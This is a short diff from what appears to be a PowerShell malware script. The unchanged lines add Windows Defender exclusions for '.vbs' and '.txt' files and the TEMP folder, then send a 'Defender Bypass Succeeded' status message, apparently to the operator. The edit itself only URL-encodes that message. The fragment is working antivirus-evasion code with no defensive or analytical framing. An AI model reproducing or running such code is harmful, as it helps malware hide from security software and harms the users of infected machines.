@@ -20,6 +20,6 @@ else
 	Add-MpPreference -ExclusionExtension '.vbs';
 	Add-MpPreference -ExclusionExtension '.txt';
 	Add-MpPreference -ExclusionPath $env:TEMP;
-	$message = "%E2%9C%94 Defender Bypass Succeeded";
+	$message = "%E2%9C%94%20Defender%20Bypass%20Succeeded";
 	Send_Message;
 }
